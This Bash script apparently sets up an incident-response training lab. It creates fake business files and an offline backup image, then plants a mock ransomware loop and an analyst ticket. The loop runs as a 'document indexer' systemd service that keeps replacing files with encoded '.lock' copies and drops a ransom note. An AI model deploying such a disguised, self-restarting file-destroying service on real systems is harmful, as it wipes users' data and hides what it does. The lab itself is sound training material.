#!/usr/bin/env bash
# Lab 122: un proceso "cifra" en masa /srv/datos y sigue vivo vigilando. Hay un
# respaldo desconectado (imagen de disco sin montar) con SHA256SUMS.
set -e
id datos >/dev/null 2>&1 || useradd -r -s /usr/sbin/nologin datos
D=/srv/datos
mkdir -p $D/clientes $D/facturas $D/contratos
python3 - <<'PY'
import random
random.seed(122)
for i in range(1, 81):
    open(f"/srv/datos/clientes/cliente-{i:03d}.csv", "w").write(
        "id,nombre,email,saldo\n" + "".join(f"{i}{j},Cliente {i}-{j},c{i}{j}@example.com,{random.randint(0,9999)}\n" for j in range(20)))
for i in range(1, 91):
    open(f"/srv/datos/facturas/factura-2024-{i:04d}.txt", "w").write(
        f"Factura 2024-{i:04d}\nImporte: {random.randint(100,9000)} EUR\nEstado: pagada\n")
for i in range(1, 31):
    open(f"/srv/datos/contratos/contrato-{i:02d}.md", "w").write(
        f"# Contrato {i}\n\nVigencia: 12 meses.\nRenovación automática: sí.\n")
PY
chown -R datos:datos $D
( cd $D && find . -type f | sort | xargs sha256sum ) > /opt/lab/.ref-sums
chmod 0600 /opt/lab/.ref-sums

# Respaldo desconectado: un "disco" en un fichero, sin montar.
truncate -s 64M /var/backups/respaldo-offline.img
mkfs.ext4 -q -L RESPALDO /var/backups/respaldo-offline.img
mkdir -p /mnt/respaldo
mount -o loop /var/backups/respaldo-offline.img /mnt/respaldo
mkdir -p /mnt/respaldo/datos
rsync -a $D/ /mnt/respaldo/datos/
cp /opt/lab/.ref-sums /mnt/respaldo/SHA256SUMS
echo "Respaldo semanal de /srv/datos · $(date +%F)" > /mnt/respaldo/LEEME.txt
umount /mnt/respaldo

# El "cifrador": cifra lo que encuentre y se queda vigilando.
cat > /usr/local/sbin/datos-indexer <<'X'
#!/bin/bash
# Indexador de documentos (v1.3)
while :; do
  find /srv/datos -type f ! -name '*.lock' ! -name 'LEEME-RESCATE.txt' 2>/dev/null | while read -r f; do
    base64 -w0 "$f" | rev > "$f.lock" && rm -f "$f"
  done
  [ -e /srv/datos/LEEME-RESCATE.txt ] || printf 'Tus ficheros están cifrados.\nEscribe a recuperar@example.invalid\n' > /srv/datos/LEEME-RESCATE.txt
  sleep 20
done
X
chmod 0755 /usr/local/sbin/datos-indexer
cat > /etc/systemd/system/datos-indexer.service <<'UNIT'
[Unit]
Description=Indexador de documentos de /srv/datos
[Service]
ExecStart=/usr/local/sbin/datos-indexer
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now datos-indexer
for _ in $(seq 1 30); do [ -z "$(find $D -type f ! -name '*.lock' ! -name 'LEEME-RESCATE.txt')" ] && break; sleep 1; done

mkdir -p /home/analista/ticket
cat > /home/analista/ticket/INC-122.txt <<'TXT'
INC-122 · files-122 · CRÍTICO
Los usuarios no pueden abrir nada de /srv/datos y ha aparecido LEEME-RESCATE.txt.
Hay un respaldo semanal DESCONECTADO en /var/backups/respaldo-offline.img
(imagen de disco, sin montar). Recupera los datos y demuestra con hashes que
están íntegros. Anota en ~/incidente.txt: alterados=<N ficheros afectados>.
TXT
chown -R analista:analista /home/analista/ticket
echo "Lab 122 plantado."
